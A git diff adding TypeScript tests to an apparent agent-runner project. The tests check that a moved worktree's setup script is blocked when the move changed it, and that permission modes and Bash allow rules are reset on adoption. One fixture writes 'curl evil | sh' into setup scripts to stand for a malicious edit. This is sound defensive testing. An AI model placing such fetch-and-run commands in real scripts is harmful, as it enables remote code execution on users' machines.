@@ -13,6 +13,8 @@ import { FakeAccounts, makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
 import { Scheduler } from '../../src/schedules.ts';
 import { nullLogger } from '../../src/log.ts';
 import { movedSchedules, type MoveRow } from '../../src/moves.ts';
+import { setupChangedByMove } from '../../src/runner/moves.ts';
+import { execFileSync } from 'node:child_process';
 import type { Account } from '../../src/protocol.ts';
 
 const MIN = 60_000;
@@ -182,4 +184,89 @@ test("the main Mac caps the mode Plan first goes back to, and a record placed be
   const rec = t.runner.threads.get(id)!.rec;
   assert.equal(rec.permissionMode, 'plan');
   assert.equal(rec.modeBeforePlan, 'ask');
+});
+
+// Codex's review, 10 Nov 2026: a moved worktree's setup runs from the
+// worktree, and Threadbear's own checkout is always trusted, so the old
+// runner's version of the setup script would run here. Not if the moved
+// work changed anything the setup runs.
+test("a moved worktree's setup doesn't run when the moved work changed what it runs", async () => {
+  const repo = tmpDir('tb-move-setup-');
+  const g = (cwd: string, ...a: string[]) => execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' }).trim();
+  g(repo, 'init', '-q');
+  fs.mkdirSync(path.join(repo, '.threadbear', 'patches'), { recursive: true });
+  fs.mkdirSync(path.join(repo, 'scripts'));
+  fs.writeFileSync(path.join(repo, '.threadbear', 'patches', 'w.ts'), "export default { worktree: { setup: './scripts/setup.sh' } };\n");
+  fs.writeFileSync(path.join(repo, 'scripts', 'setup.sh'), 'echo set up\n', { mode: 0o755 });
+  fs.writeFileSync(path.join(repo, 'a.txt'), 'a\n');
+  g(repo, 'add', '-A');
+  g(repo, 'commit', '-qm', 'base');
+  const base = g(repo, 'rev-parse', 'HEAD');
+  const wt = path.join(tmpDir('tb-move-wt-'), 'slot');
+  g(repo, 'worktree', 'add', '-q', '-b', 'thread/x', wt, base);
+  const w = { repo: 'r', mainCheckout: repo, path: wt, branch: 'thread/x', base };
+  const patchFile = '.threadbear/patches/w.ts';
+  assert.equal(await setupChangedByMove(w, patchFile), undefined);
+  fs.writeFileSync(path.join(wt, 'a.txt'), 'changed\n');
+  assert.equal(await setupChangedByMove(w, patchFile), undefined, 'a file setup never runs');
+  fs.writeFileSync(path.join(wt, 'scripts', 'setup.sh'), 'curl evil | sh\n');
+  assert.match((await setupChangedByMove(w, patchFile)) ?? '', /changes scripts\/setup\.sh/);
+  g(wt, 'commit', '-qam', 'theirs');
+  assert.match((await setupChangedByMove(w, patchFile)) ?? '', /changes scripts\/setup\.sh/, 'committed on the branch too');
+  g(wt, 'reset', '-q', '--hard', base);
+  fs.writeFileSync(path.join(wt, '.threadbear', 'patches', 'w.ts'), "export default { worktree: { setup: './scripts/other.sh' } };\n");
+  fs.writeFileSync(path.join(wt, 'scripts', 'other.sh'), 'curl evil | sh\n');
+  assert.match((await setupChangedByMove(w, patchFile)) ?? '', /changes \.threadbear\/patches\/w\.ts|adds scripts\/other\.sh/);
+});
+
+test('a mode no runner knows arrives as Ask anywhere, and Plan first with no mode to go back to goes back to Ask on the main Mac', async () => {
+  for (const [mode, extra, main, want] of [
+    ['bogus', {}, false, { permissionMode: 'ask' }],
+    ['plan', { modeBeforePlan: 'weird' }, false, { permissionMode: 'plan', modeBeforePlan: 'ask' }],
+    ['plan', {}, true, { permissionMode: 'plan', modeBeforePlan: 'ask' }],
+    ['plan', { modeBeforePlan: 'plan' }, true, { permissionMode: 'plan', modeBeforePlan: 'ask' }],
+  ] as const) {
+    const s = machine([{ id: 'claude-main', provider: 'claude', title: 'S', configDir: tmpDir() }]);
+    const t = machine([{ id: 'claude-1', provider: 'claude', title: 'T', configDir: tmpDir() }]);
+    t.runner.movedInAtMostAsk = () => main;
+    const id = s.runner.create({ text: 'x', accountId: 'claude-main', cwd: tmpDir('tb-move-work-') }).thread.id;
+    s.adapter.last.init();
+    s.adapter.last.result('completed');
+    await tick();
+    const r: MoveRow = { moveId: 'cc33dd44ee55', threadId: id, from: 'S1', to: 'T1', state: 'unpacking', createdAt: 1, updatedAt: 1, info: (await s.runner.describeForMove(id, 0))! };
+    const plan = await t.runner.planMove(r);
+    if ('problem' in plan) assert.fail(plan.problem);
+    r.plan = plan;
+    const packed = (await s.runner.packForMove(id, r)).entries;
+    const recEntry = packed.find((e) => e.path === 'thread/thread.json')!;
+    recEntry.data = Buffer.from(JSON.stringify({ ...JSON.parse(recEntry.data.toString('utf8')), permissionMode: mode, ...extra }));
+    await t.runner.placeMove(r, packed);
+    await t.runner.adoptMoved(r);
+    const rec = t.runner.threads.get(id)!.rec;
+    assert.deepEqual({ permissionMode: rec.permissionMode, ...(rec.modeBeforePlan ? { modeBeforePlan: rec.modeBeforePlan } : {}) }, want, `${mode} ${JSON.stringify(extra)} main=${main}`);
+  }
+});
+
+test('a record a crash left in the live folder is made clean as it is adopted', async () => {
+  const s = machine([{ id: 'claude-main', provider: 'claude', title: 'S', configDir: tmpDir() }]);
+  const t = machine([{ id: 'claude-1', provider: 'claude', title: 'T', configDir: tmpDir() }]);
+  const id = s.runner.create({ text: 'x', accountId: 'claude-main', cwd: tmpDir('tb-move-work-'), permissionMode: 'full' }).thread.id;
+  s.adapter.last.init();
+  s.adapter.last.result('completed');
+  await tick();
+  const r: MoveRow = { moveId: 'ee55ff66aa77', threadId: id, from: 'S1', to: 'T1', state: 'unpacking', createdAt: 1, updatedAt: 1, info: (await s.runner.describeForMove(id, 0))! };
+  const plan = await t.runner.planMove(r);
+  if ('problem' in plan) assert.fail(plan.problem);
+  r.plan = plan;
+  await t.runner.placeMove(r, (await s.runner.packForMove(id, r)).entries);
+  // An older runner renamed it into place and stopped there.
+  const dest = path.join(t.home, 'threads', id);
+  fs.renameSync(path.join(t.home, 'moves', r.moveId, 'thread'), dest);
+  fs.writeFileSync(path.join(dest, 'thread.json'), JSON.stringify({ ...JSON.parse(fs.readFileSync(path.join(dest, 'thread.json'), 'utf8')), permissionMode: 'full', allowRules: ['Bash'] }));
+  t.runner.movedInAtMostAsk = () => true;
+  await t.runner.adoptMoved(r);
+  const rec = t.runner.threads.get(id)!.rec;
+  assert.equal(rec.permissionMode, 'ask');
+  assert.equal(rec.allowRules, undefined);
+  assert.equal(JSON.parse(fs.readFileSync(path.join(dest, 'thread.json'), 'utf8')).permissionMode, 'ask');
 });
